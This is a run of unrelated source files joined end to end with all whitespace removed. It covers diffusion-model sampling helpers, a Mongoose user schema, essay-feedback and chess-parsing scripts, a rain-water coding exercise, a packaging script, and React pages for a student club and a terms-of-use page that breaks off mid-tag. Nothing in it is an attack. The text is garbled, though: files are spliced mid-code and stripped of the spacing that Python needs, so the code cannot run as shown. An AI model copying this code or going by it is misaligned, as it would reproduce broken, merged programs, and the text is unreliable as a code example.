rs,azims,cond_motion,cond_view,)unload_module_gpu(model.conditioner)returnforward_inputs,forward_frame_indices,backward_inputs,backward_frame_indicesdefdo_sample(model,sampler,value_dict,num_samples,H,W,C,F,force_uc_zero_embeddings:Optional[List]=None,force_cond_zero_embeddings:Optional[List]=None,batch2model_input:List=None,return_latents=False,filter=None,T=None,additional_batch_uc_fields=None,decoding_t=None,):force_uc_zero_embeddings=default(force_uc_zero_embeddings,[])batch2model_input=default(batch2model_input,[])additional_batch_uc_fields=default(additional_batch_uc_fields,[])precision_scope=autocastwithtorch.no_grad():withprecision_scope("cuda"):withmodel.ema_scope():ifTisnotNone:num_samples=[num_samples,T]else:num_samples=[num_samples]load_module_gpu(model.conditioner)batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,num_samples,T=T,additional_batch_uc_fields=additional_batch_uc_fields,)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=force_uc_zero_embeddings,force_cond_zero_embeddings=force_cond_zero_embeddings,)unload_module_gpu(model.conditioner)forkinc:ifnotk=="crossattn":c[k],uc[k]=map(lambday:y[k][:math.prod(num_samples)].to("cuda"),(c,uc))additional_model_inputs={}forkinbatch2model_input:ifk=="image_only_indicator":assertTisnotNoneifisinstance(sampler.guider,(VanillaCFG,LinearPredictionGuider,TrianglePredictionGuider,TrapezoidPredictionGuider,SpatiotemporalPredictionGuider,),):additional_model_inputs[k]=torch.zeros(num_samples[0]*2,num_samples[1]).to("cuda")else:additional_model_inputs[k]=torch.zeros(num_samples).to("cuda")else:additional_model_inputs[k]=batch[k]shape=(math.prod(num_samples),C,H//F,W//F)randn=torch.randn(shape).to("cuda")defdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,**additional_model_inputs)load_module_gpu(model.model)load_module_gpu(model.denoiser)samples_z=sampler(denoiser,randn,cond=c,uc=uc)unload_module_gpu(model.model)unload_module_gpu(model.denoiser)load_module_gpu(model.first_stage_model)ifisinstance(model.first_stage_model.decoder,VideoDecoder):samples_x=model.decode_first_stage(samples_z,timesteps=default(decoding_t,T))else:samples_x=model.decode_first_stage(samples_z)samples=torch.clamp((samples_x+1.0)/2.0,min=0.0,max=1.0)unload_module_gpu(model.first_stage_model)iffilterisnotNone:samples=filter(samples)ifreturn_latents:returnsamples,samples_zreturnsamplesdefprepare_sampling_(model,sampler,value_dict,num_samples,force_uc_zero_embeddings:Optional[List]=None,force_cond_zero_embeddings:Optional[List]=None,batch2model_input:List=None,T=None,additional_batch_uc_fields=None,):force_uc_zero_embeddings=default(force_uc_zero_embeddings,[])batch2model_input=default(batch2model_input,[])additional_batch_uc_fields=default(additional_batch_uc_fields,[])precision_scope=autocastwithtorch.no_grad():withprecision_scope("cuda"):withmodel.ema_scope():ifTisnotNone:num_samples=[num_samples,T]else:num_samples=[num_samples]batch,batch_uc=get_batch(get_unique_embedder_keys_from_conditioner(model.conditioner),value_dict,num_samples,T=T,additional_batch_uc_fields=additional_batch_uc_fields,)c,uc=model.conditioner.get_unconditional_conditioning(batch,batch_uc=batch_uc,force_uc_zero_embeddings=force_uc_zero_embeddings,force_cond_zero_embeddings=force_cond_zero_embeddings,)forkinc:ifnotk=="crossattn":c[k],uc[k]=map(lambday:y[k][:math.prod(num_samples)].to("cuda"),(c,uc))additional_model_inputs={}forkinbatch2model_input:ifk=="image_only_indicator":assertTisnotNoneifisinstance(sampler.guider,(VanillaCFG,LinearPredictionGuider,TrianglePredictionGuider,TrapezoidPredictionGuider,SpatiotemporalPredictionGuider,),):additional_model_inputs[k]=torch.zeros(num_samples[0]*2,num_samples[1]).to("cuda")else:additional_model_inputs[k]=torch.zeros(num_samples).to("cuda")else:additional_model_inputs[k]=batch[k]returnc,uc,additional_model_inputsdefdo_sample_per_step(model,sampler,noisy_latents,c,uc,step,additional_model_inputs):precision_scope=autocastwithtorch.no_grad():withprecision_scope("cuda"):withmodel.ema_scope():noisy_latents_scaled,s_in,sigmas,num_sigmas,_,_=(sampler.prepare_sampling_loop(noisy_latents.clone(),c,uc,sampler.num_steps))ifstep==0:latents=noisy_latents_scaledelse:latents=noisy_latentsdefdenoiser(input,sigma,c):returnmodel.denoiser(model.model,input,sigma,c,**additional_model_inputs)gamma=(min(sampler.s_churn/(num_sigmas-1),2**0.5-1)ifsampler.s_tmin<=sigmas[step]<=sampler.s_tmaxelse0.0)load_module_gpu(model.model)load_module_gpu(model.denoiser)samples_z=sampler.sampler_step(s_in*sigmas[step],s_in*sigmas[step+1],denoiser,latents,c,uc,gamma,)returnsamples_zdefprepare_sampling(version_dict,model,image,seed=23,polar_rad=[10]*21,azim_rad=np.linspace(0,360,21+1)[1:],cond_motion=None,cond_view=None,):options=version_dict["options"]H=version_dict["H"]W=version_dict["W"]T=version_dict["T"]C=version_dict["C"]F=version_dict["f"]init_dict={"orig_width":576,"orig_height":576,"target_width":W,"target_height":H,}ukeys=set(get_unique_embedder_keys_from_conditioner(model.conditioner))value_dict=init_embedder_options_no_st(ukeys,init_dict,negative_prompt=options.get("negative_promt",""),prompt="A3Dmodel.",)if"fps"notinukeys:value_dict["fps"]=6value_dict["is_image"]=0value_dict["is_webvid"]=0value_dict["image_only_indicator"]=0cond_aug=0.00ifcond_motionisnotNone:value_dict["cond_frames_without_noise"]=cond_motionvalue_dict["cond_frames"]=(cond_motion[:,None].repeat(1,cond_view.shape[0],1,1,1).flatten(0,1))value_dict["cond_motion"]=cond_motionvalue_dict["cond_view"]=cond_viewelse:value_dict["cond_frames_without_noise"]=imagevalue_dict["cond_frames"]=image+cond_aug*torch.randn_like(image)value_dict["cond_aug"]=cond_augvalue_dict["polar_rad"]=polar_radvalue_dict["azimuth_rad"]=azim_radvalue_dict["rotated"]=Falsevalue_dict["cond_motion"]=cond_motionvalue_dict["cond_view"]=cond_view#seed_everything(seed)options["num_frames"]=Tsampler,num_rows,num_cols=init_sampling_no_st(options=options)num_samples=num_rows*num_colsc,uc,additional_model_inputs=prepare_sampling_(model,sampler,value_dict,num_samples,force_uc_zero_embeddings=options.get("force_uc_zero_embeddings",None),force_cond_zero_embeddings=options.get("force_cond_zero_embeddings",None),batch2model_input=["num_video_frames","image_only_indicator"],T=T,)returnc,uc,additional_model_inputs,samplerdefget_unique_embedder_keys_from_conditioner(conditioner):returnlist(set([x.input_keyforxinconditioner.embedders]))defget_batch_sv3d(keys,value_dict,N,T,device):batch={}batch_uc={}forkeyinkeys:ifkey=="fps_id":batch[key]=(torch.tensor([value_dict["fps_id"]]).to(device).repeat(int(math.prod(N))))elifkey=="motion_bucket_id":batch[key]=(torch.tensor([value_dict["motion_bucket_id"]]).to(device).repeat(int(math.prod(N))))elifkey=="cond_aug":batch[key]=repeat(torch.tensor([value_dict["cond_aug"]]).to(device),"1->b",b=math.prod(N),)elifkey=="cond_frames"orkey=="cond_frames_without_noise":batch[key]=repeat(value_dict[key],"1...->b...",b=N[0])elifkey=="polars_rad"orkey=="azimuths_rad":batch[key]=torch.tensor(value_dict[key]).to(device).repeat(N[0])else:batch[key]=value_dict[key]ifTisnotNone:batch["num_video_frames"]=Tforkeyinbatch.keys():ifkeynotinbatch_ucandisinstance(batch[key],torch.Tensor):batch_uc[key]=torch.clone(batch[key])returnbatch,batch_ucdefget_batch(keys,value_dict:dict,N:Union[List,ListConfig],device:str="cuda",T:int=None,additional_batch_uc_fields:List[str]=[],):batch={}batch_uc={}forkeyinkeys:ifkey=="txt":batch["txt"]=[value_dict["prompt"]]*math.prod(N)batch_uc["txt"]=[value_dict["negative_prompt"]]*math.prod(N)elifkey=="original_size_as_tuple":batch["original_size_as_tuple"]=(torch.tensor([value_dict["orig_height"],value_dict["orig_width"]]).to(device).repeat(math.prod(N),1))elifkey=="crop_coords_top_left":batch["crop_coords_top_left"]=(torch.tensor([value_dict["crop_coords_top"],value_dict["crop_coords_left"]]).to(device).repeat(math.prod(N),1))elifkey=="aesthetic_score":batch["aesthetic_score"]=(torch.tensor([value_dict["aesthetic_score"]]).to(device).repeat(math.prod(N),1))batch_uc["aesthetic_score"]=(torch.tensor([value_dict["negative_aesthetic_score"]]).to(device).repeat(math.prod(N),1))elifkey=="target_size_as_tuple":batch["target_size_as_tuple"]=(torch.tensor([value_dict["target_height"],value_dict["target_width"]]).to(device).repeat(math.prod(N),1))elifkey=="fps":batch[key]=(torch.tensor([value_dict["fps"]]).to(device).repeat(math.prod(N)))elifkey=="fps_id":batch[key]=(torch.tensor([value_dict["fps_id"]]).to(device).repeat(math.prod(N)))elifkey=="motion_bucket_id":batch[key]=(torch.tensor([value_dict["motion_bucket_id"]]).to(device).repeat(math.prod(N)))elifkey=="pool_image":batch[key]=repeat(value_dict[key],"1...->b...",b=math.prod(N)).to(device,dtype=torch.half)elifkey=="is_image":batch[key]=(torch.tensor([value_dict["is_image"]]).to(device).repeat(math.prod(N)).long())elifkey=="is_webvid":batch[key]=(torch.tensor([value_dict["is_webvid"]]).to(device).repeat(math.prod(N)).long())elifkey=="cond_aug":batch[key]=repeat(torch.tensor([value_dict["cond_aug"]]).to("cuda"),"1->b",b=math.prod(N),)elif(key=="cond_frames"orkey=="cond_frames_without_noise"orkey=="back_frames"):#batch[key]=repeat(value_dict[key],"1...->b...",b=N[0])batch[key]=value_dict[key]elifkey=="interpolation_context":batch[key]=repeat(value_dict["interpolation_context"],"b...->(bn)...",n=N[1])elifkey=="start_frame":assertTisnotNonebatch[key]=repeat(value_dict[key],"b...->(bt)...",t=T)elifkey=="polar_rad"orkey=="azimuth_rad":batch[key]=(torch.tensor(value_dict[key]).to(device).repeat(math.prod(N)//T))elifkey=="rotated":batch[key]=(torch.tensor([value_dict["rotated"]]).to(device).repeat(math.prod(N)))else:batch[key]=value_dict[key]ifTisnotNone:batch["num_video_frames"]=Tforkeyinbatch.keys():ifkeynotinbatch_ucandisinstance(batch[key],torch.Tensor):batch_uc[key]=torch.clone(batch[key])elifkeyinadditional_batch_uc_fieldsandkeynotinbatch_uc:batch_uc[key]=copy.copy(batch[key])returnbatch,batch_ucdefload_model(config:str,device:str,num_frames:int,num_steps:int,verbose:bool=False,):config=OmegaConf.load(config)ifdevice=="cuda":config.model.params.conditioner_config.params.emb_models[0].params.open_clip_embedding_config.params.init_device=deviceconfig.model.params.sampler_config.params.verbose=verboseconfig.model.params.sampler_config.params.num_steps=num_stepsconfig.model.params.sampler_config.params.guider_config.params.num_frames=(num_frames)ifdevice=="cuda":withtorch.device(device):model=instantiate_from_config(config.model).to(device).eval()else:model=instantiate_from_config(config.model).to(device).eval()filter=DeepFloydDataFiltering(verbose=False,device=device)returnmodel,filterconstmongoose=require('mongoose');constuserSchema=newmongoose.Schema({username:{type:String,required:true,},password:{type:String,required:true,},email:{type:String,required:true,},games:[{type:mongoose.Schema.Types.ObjectId,ref:'Game',},],});module.exports=mongoose.model('User',userSchema);#Explainiabilityimportnumpyasnpimportpandasaspdclassexplain():def__init__(self,row,df):self.row=rowself.df=df#GivefeedbackforeachfeaturedefcheckAverageWordLength(self):ifself.row['AverageWordLength'].iloc[0]<self.df['AverageWordLength'].mean():return"Tryincorporatingbiggerwordsintoyouressay."else:return"Averagewordlengthisgood."defcheckMisspelled(self):ifself.row['percent_misspelled'].iloc[0]>self.df['percent_misspelled'].median():return"Lookforspellingmistakesinyouressay."else:return"Minimalspellingmistakes."defcheckLength(self):if(self.row['word_count'].iloc[0]<self.df['word_count'].median())or(self.row['sentcount'].iloc[0]<self.df['sentcount'].median()):return"Trytomakeyouressaylonger."else:return"Essayislongenough."defcheckKeyWords(self):ifself.row['percent_key_words'].iloc[0]>self.df['percent_key_words'].quantile([0.75]).iloc[0]:return"Youressaymaybereferringtotheprompttoomuch."elifself.row['percent_key_words'].iloc[0]<self.df['percent_key_words'].quantile([0.25]).iloc[0]:return"Youressaymaynotbereferringtothepromptenough."else:return"Essayechoesthepromptwellenough."defcheckVocabulary(self):if(self.row['score'].iloc[0]<self.df['score'].median())or(self.row['vocabulary'].iloc[0]<self.df['vocabulary'].median()):return"Trytoincorporatemoreeffectivevocabularyintoyouressay."else:return"Gooduseofvocabulary."defcheckPercentStopWords(self):ifself.row['percent_stop_words'].iloc[0]>self.df['percent_stop_words'].mean():return"Tryusinglessstopwords(a,the,is,are,etc.)."else:return"Minimaluseofstopwords."importunittestimportnumpyasnpclassSolution:deftrap(self,heights:list[int])->int:heights=np.array(heights)volume=0forrowinrange(np.max(heights)):bpositives=heights-row>0group=0filling=Falseforbpositiveinbpositives:if(filling):ifnot(bpositive):group+=1else:volume+=groupgroup=0elif(notfillingandbpositive):filling=TruereturnvolumeclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest1(self):self.assertEqual(self.solution.trap([0,1,0,2,1,0,1,3,2,1,2,1]),6)deftest2(self):self.assertEqual(self.solution.trap([4,2,0,3,2,5]),9)unittest.main()importtorchfromtypingimportOptional,Unionfrom...utilimportdefault,instantiate_from_configclassEDMSampling:def__init__(self,p_mean=-1.2,p_std=1.2):self.p_mean=p_meanself.p_std=p_stddef__call__(self,n_samples,rand=None):log_sigma=self.p_mean+self.p_std*default(rand,torch.randn((n_samples,)))returnlog_sigma.exp()classDiscreteSampling:def__init__(self,discretization_config,num_idx,do_append_zero=False,flip=True):self.num_idx=num_idxself.sigmas=instantiate_from_config(discretization_config)(num_idx,do_append_zero=do_append_zero,flip=flip)defidx_to_sigma(self,idx):returnself.sigmas[idx]def__call__(self,n_samples,rand=None):idx=default(rand,torch.randint(0,self.num_idx,(n_samples,)),)returnself.idx_to_sigma(idx)classZeroSampler:def__call__(self,n_samples:int,rand:Optional[torch.Tensor]=None)->torch.Tensor:returntorch.zeros_like(default(rand,torch.randn((n_samples,))))+1.0e-5importpandasaspdimportgensimfromgensim.modelsimportWord2Vecimportnltkfromnltk.tokenizeimportword_tokenizeimportstring#EnsureNLTK'stokenizerisavailablenltk.download('punkt_tab')#Sampledata(youcanloadyourrealdatasethere)data=[{"number":"217B","title":"PrinciplesofModernOceanEngineering","description":"OceanEngineeringisgainingarenewedfloodofinterest."},{"number":"199","title":"SupervisedIndependentStudyandResearch","description":"Enrollmentrestrictionsapply;seetheCourseswebsitefordetails."}]#ConvertdatatoaDataFrameforeasiermanipulationclass_data=pd.DataFrame(data)#Combinetitleanddescriptionintoasingletextfieldclass_data['combined']=class_data['title']+""+class_data['description']#Preprocessandtokenizethetextdefpreprocess_text(text):#Tokenizeandremovepunctuationtokens=word_tokenize(text.lower())tokens=[wordforwordintokensifword.isalpha()]#Keeponlyalphabeticwordsreturntokens#Applypreprocessingtothecombinedfieldclass_data['tokens']=class_data['combined'].apply(preprocess_text)import{Inter}from"next/font/google";import"./globals.css";constinter=Inter({subsets:["latin"]});exportconstmetadata={title:"Instagram",description:"Instagram",};exportdefaultfunctionRootLayout({children}){return(<htmllang="en"><head><linkrel="icon"href="/favicon.png"/></head><bodyclassName={inter.className}>{children}</body></html>);}importpandasaspdfromdatetimeimportdatetimeimportchess.pgndf=pd.DataFrame(columns=['Date','White','Black','Result','WhiteElo','BlackElo','BaseTime','Increment','Link','OpeningECO','OpeningURL','Moves'])forpgnin[open('shibogod-black.pgn'),open('shibogod-white.pgn')]:while(True):game=chess.pgn.read_game(pgn)if(gameisNone):breakdate=datetime.strptime(game.headers['Date'],'%Y.%m.%d')white=game.headers['White']black=game.headers['Black']result={'1-0':1,'0-1':0,'1/2-1/2':0.5}[game.headers['Result']]white_elo=int(game.headers['WhiteElo'])black_elo=int(game.headers['BlackElo'])time_control=game.headers['TimeControl'].split('+')base_time=int(time_control[0])increment=int(time_control[1])iflen(time_control)==2else0link=game.headers['Link']moves=game.mainline_moves()opening_eco=game.headers['ECO']opening_url=game.headers['ECOUrl']df=pd.concat([df,pd.DataFrame([{'Date':date,'White':white,'Black':black,'Result':result,'WhiteElo':white_elo,'BlackElo':black_elo,'BaseTime':base_time,'Increment':increment,'Link':link,'OpeningECO':opening_eco,'OpeningURL':opening_url,'Moves':str(moves),}])],ignore_index=True)df.sort_values(by=['Date'],ascending=False,inplace=True)df.reset_index(drop=True).to_feather('games.feather')fromsetuptoolsimportsetup,find_packageswithopen('README.md')asf:readme=f.read()setup_args={'name':'PyAutoWebAPI','version':'0.0.1','description':'AsimplewaytocallAPIsfromPython','long_description_content_type':'text/markdown','long_description':readme,'license':'MIT','packages':find_packages(),'author':'NathanDai','author_email':'nathandai2000@gmail.com','keywords':['API','PyAutoWebAPI','webAPI'],'url':'https://github.com/NathanDai5287/PyAutoWebAPI','download_url':'https://pypi.org/project/pyautowebapi/',}install_requires=['requests',]if__name__=='__main__':setup(**setup_args,install_requires=install_requires)importReactfrom'react';importImagefrom'next/legacy/image';//Importfrom'next/image'constofficers=[{name:'RubyGao',position:'President',imageUrl:'/ruby_beautify.jpg'},{name:'LynnHuang',position:'VicePresident',imageUrl:'/lynn.png'},{name:'SydneyDanon',position:'Secretary',imageUrl:'/sydney.png'},{name:'RitvikIrigireddy',position:'Treasurer',imageUrl:'/ritvik.jpeg'},{name:'NathanDai',position:'DirectorofCorporateSynergyandStrategicAlignment',imageUrl:'/wayne.jpeg',},{name:'ColeTerjesen',position:'PresidentElect',imageUrl:'/cole-cropped.jpg'},//...addmoreofficersasneeded];exportdefaultfunctionMeetYourOfficers(){return(<divclassName='mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10mb-12'><h1className='text-4xlfont-boldmb-10text-blue-500'>MeetYourOfficers</h1><divclassName='gridgrid-cols-2sm:grid-cols-2lg:grid-cols-3gap-6'>{officers.map((officer,index)=>(<divkey={index}className={'officer-infop-4text-center'+((officer.name==='NathanDai')?'rounded-lgbg-gradient-to-brfrom-slate-50to-slate-300shadow-2xlring-1ring-blue-500/50hover:ring-blue-500':'')}id={officer.name.split('')[0].toLowerCase()}><divclassName='relativeinline-blockw-40h-40mx-automb-4'><Imagesrc={officer.imageUrl}alt={`Imageof${officer.name}`}layout='fill'objectFit='cover'//Thiswillcovertheareaofthediv,youcanalsouse'contain'ifyoudon'twanttocroptheimageclassName='rounded-full'/></div><h2className='text-xlfont-semibold'>{officer.name}</h2><pclassName='text-mdtext-gray-600'>{officer.position}</p></div>))}</div></div>);}fromabcimportabstractmethodfromtypingimportAny,Tupleimporttorchimporttorch.nn.functionalasFfromtorchimportnnclassAbstractRegularizer(nn.Module):def__init__(self):super().__init__()defforward(self,z:torch.Tensor)->Tuple[torch.Tensor,dict]:raiseNotImplementedError()@abstractmethoddefget_trainable_parameters(self)->Any:raiseNotImplementedError()classIdentityRegularizer(AbstractRegularizer):defforward(self,z:torch.Tensor)->Tuple[torch.Tensor,dict]:returnz,dict()defget_trainable_parameters(self)->Any:yieldfrom()defmeasure_perplexity(predicted_indices:torch.Tensor,num_centroids:int)->Tuple[torch.Tensor,torch.Tensor]:#src:https://github.com/karpathy/deep-vector-quantization/blob/main/model.py#evalclusterperplexity.whenperplexity==num_embeddingsthenallclustersareusedexactlyequallyencodings=(F.one_hot(predicted_indices,num_centroids).float().reshape(-1,num_centroids))avg_probs=encodings.mean(0)perplexity=(-(avg_probs*torch.log(avg_probs+1e-10)).sum()).exp()cluster_use=torch.sum(avg_probs>0)returnperplexity,cluster_useimportHorizontalWebinarGridItemfrom'./HorizontalWebinarGridItem';constHorizontalWebinarGrid=({gridItems})=>{return(<divclassName='overflow-x-autoflexspace-x-4py-2'>{gridItems.map((webinar,i)=>(<HorizontalWebinarGridItemkey={i}webinar={webinar}/>))}</div>);};exportdefaultHorizontalWebinarGrid;importLiveSessionsfrom'./LiveSessions';importClassPostsfrom'./ClassPosts';importSidebarfrom'../sidebar/Sidebar';constStudySessionsAndPosts=()=>{return(<divclassName='flexmin-h-screen'><SidebaractiveIndex={3}/><divclassName='containermx-autop-4'><LiveSessions/><ClassPosts/></div></div>);};exportdefaultStudySessionsAndPosts;fromkeyboardimportKeyboardwithopen('words.txt')asf:words=f.read()SAMPLE_LENGTH=10000keyboard=Keyboard(layout=Keyboard.LAYOUTS['qwerty'])keyboard.load_corpus(words)print(keyboard.fitness(SAMPLE_LENGTH))#AveragesentencelengthofessaysdefaverageSentenceLength(essay):sents=essay.split(".")returnsum([len(i.split(""))foriinsents])/len(sents)importReact,{Component}from"react";import{Calendar,momentLocalizer}from"react-big-calendar";importmomentfrom"moment";require("react-big-calendar/lib/css/react-big-calendar.css");constlocalizer=momentLocalizer(moment);constmyEventsList=[{title:"LunchMeeting",start:newDate(2023,10,15),//November10th,2023end:newDate(2023,10,15),//November10th,2023allDay:true,},{title:"After-SchoolMeeting",start:newDate(2023,10,29),end:newDate(2023,10,29),allDay:true,},{title:"LunchMeeting",start:newDate(2023,11,6),//November10th,2023end:newDate(2023,11,6),//November10th,2023allDay:true,},{title:"After-SchoolMeeting",start:newDate(2023,11,13),end:newDate(2023,11,13),allDay:true,},];exportdefaultfunctionCalendarComponent(){consteventStyleGetter=(event,start,end,isSelected)=>{letnewStyle={backgroundColor:"#bfdbfe",textAlign:"center",color:"rgb(57,56,56)",borderRadius:"20px",fontSize:"13px",marginTop:"10px",fontWeight:"bold",border:"none",};return{style:newStyle,};};return(<divid="Calendar"><divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><h1className="text-4xlfont-boldmb-4text-blue-500">Calendar</h1><Calendarlocalizer={localizer}events={myEventsList}views={["month"]}timeslots={2}defaultView="month"defaultDate={newDate()}selectable={true}eventPropGetter={eventStyleGetter}/></div></div>);}importHeadfrom'next/head';constTerms=()=>{return(<divclassName='w-3/5mx-auto'><Head><title>TermsandConditions</title><linkrel='icon'href='/favicon.png'/></Head><styledangerouslySetInnerHTML={{__html:"\n[data-custom-class='body'],[data-custom-class='body']*{\nbackground:transparent!important;\n}\n[data-custom-class='title'],[data-custom-class='title']*{\nfont-family:Arial!important;\nfont-size:26px!important;\ncolor:#000000!important;\n}\n[data-custom-class='subtitle'],[data-custom-class='subtitle']*{\nfont-family:Arial!important;\ncolor:#595959!important;\nfont-size:14px!important;\n}\n[data-custom-class='heading_1'],[data-custom-class='heading_1']*{\nfont-family:Arial!important;\nfont-size:19px!important;\ncolor:#000000!important;\n}\n[data-custom-class='heading_2'],[data-custom-class='heading_2']*{\nfont-family:Arial!important;\nfont-size:17px!important;\ncolor:#000000!important;\n}\n[data-custom-class='body_text'],[data-custom-class='body_text']*{\ncolor:#595959!important;\nfont-size:14px!important;\nfont-family:Arial!important;\n}\n[data-custom-class='link'],[data-custom-class='link']*{\ncolor:#3030F1!important;\nfont-size:14px!important;\nfont-family:Arial!important;\nword-break:break-word!important;\n}\n",}}/><divdata-custom-class='body'><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='title'style={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:19}}/></bdt><spanstyle={{fontSize:19}}><strong>TERMSOFUSE</strong><bdtclassName='else-block'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='subtitle'style={{lineHeight:'1.5'}}><strong>Lastupdated</strong>{''}<bdtclassName='question'><strong>03/18/2024</strong></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.1'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'115%'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'115%'}}><br/></div><divstyle={{lineHeight:'1.5'}}><strong><spandata-custom-class='heading_1'>AGREEMENTTOOURLEGALTERMS</span></strong></div></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'id='agreement'style={{lineHeight:'1.5'}}><aname='_6aa3gkhykvst'/></div></div><divalign='center'style={{lineHeight:1}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Weare{''}<bdtclassName='block-containerquestionquestion-in-editor'data-id='9d459c4e-c548-e5cb-7729-a118548965d2'data-type='question'>EnduraScribe</bdt><bdtclassName='block-component'/>(<bdtclassName='block-component'/>&quot;<strong>Company</strong>,&quot;&quot;<strong>we</strong>,&quot;&quot;<strong>us</strong>,&quot;&quot;<strong>our</strong>&quot;<bdtclassName='statement-end-if-in-editor'/>)<spanstyle={{fontSize:'11.0pt',lineHeight:'115%',msoFareastFontFamily:'Calibri',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',msoFareastFontFamily:'Calibri',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',msoFareastFontFamily:'Calibri',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><bdtclassName='question'><bdtclassName='block-component'>.</bdt></bdt></span><bdtclassName='block-component'/></span></span></span></div></div><divalign='center'style={{lineHeight:1}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Weoperate<bdtclassName='block-component'/>thewebsite{''}<spanstyle={{color:'rgb(0,58,250)'}}><bdtclassName='question'><ahref='http://www.endurascribe.com'target='_blank'data-custom-class='link'>http://www.endurascribe.com</a></bdt></span>{''}(the<bdtclassName='block-component'/>&quot;<strong>Site</strong>&quot;<bdtclassName='statement-end-if-in-editor'/>)<bdtclassName='block-component'/><bdtclassName='block-component'/>,aswellasanyotherrelatedproductsandservicesthatreferorlinktotheselegalterms(the{''}<bdtclassName='block-component'/>&quot;<strong>LegalTerms</strong>&quot;<bdtclassName='statement-end-if-in-editor'/>)(collectively,the{''}<bdtclassName='block-component'/>&quot;<strong>Services</strong>&quot;<bdtclassName='statement-end-if-in-editor'/>).<bdtclassName='block-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:1}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Youcancontactusby{''}<bdtclassName='block-component'>emailat<bdtclassName='question'>nathandai2000@gmail.com</bdt>.</bdt></span></div><divclassName='MsoNormal'style={{lineHeight:1}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>TheseLegalTermsconstitutealegallybindingagreementmadebetweenyou,whetherpersonallyoronbehalfofanentity(<bdtclassName='block-component'/>&quot;<strong>you</strong>&quot;<bdtclassName='statement-end-if-in-editor'/>),and<bdtclassName='question'>EnduraScribe</bdt>,concerningyouraccesstoanduseoftheServices.YouagreethatbyaccessingtheServices,youhaveread,understood,andagreedtobeboundbyalloftheseLegalTerms.IFYOUDONOTAGREEWITHALLOFTHESELEGALTERMS,THENYOUAREEXPRESSLYPROHIBITEDFROMUSINGTHESERVICESANDYOUMUSTDISCONTINUEUSEIMMEDIATELY.<bdtclassName='block-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:1}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>SupplementaltermsandconditionsordocumentsthatmaybepostedontheServicesfromtimetotimeareherebyexpresslyincorporatedhereinbyreference.Wereservetheright,inoursolediscretion,tomakechangesormodificationstotheseLegalTerms{''}<bdtclassName='block-component'/>atanytimeandforanyreason<bdtclassName='statement-end-if-in-editor'/>.Wewillalertyouaboutanychangesbyupdatingthe<bdtclassName='block-component'/>&quot;Lastupdated&quot;<bdtclassName='statement-end-if-in-editor'/>dateoftheseLegalTerms,andyouwaiveanyrighttoreceivespecificnoticeofeachsuchchange.ItisyourresponsibilitytoperiodicallyreviewtheseLegalTermstostayinformedofupdates.Youwillbesubjectto,andwillbedeemedtohavebeenmadeawareofandtohaveaccepted,thechangesinanyrevisedLegalTermsbyyourcontinueduseoftheServicesafterthedatesuchrevisedLegalTermsareposted.<bdtclassName='else-block'/></span></div></div><divalign='center'style={{lineHeight:1}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'id='a2595956-7028-dbe5-123e-d3d3a93ed076'><bdtdata-type='conditional-block'><bdtdata-type='body'><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><bdtclassName='block-component'/>TheServicesareintendedforuserswhoareatleast18yearsold.Personsundertheageof18arenotpermittedtouseorregisterfortheServices.</span></bdt></bdt><bdtdata-type='conditional-block'><bdtclassName='block-component'/></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:1}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}>WerecommendthatyouprintacopyoftheseLegalTermsforyourrecords.</div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'style={{lineHeight:'1.5'}}><strong>TABLEOFCONTENTS</strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><ahref='#services'><spandata-custom-class='link'><spanstyle={{color:'rgb(0,58,250)',f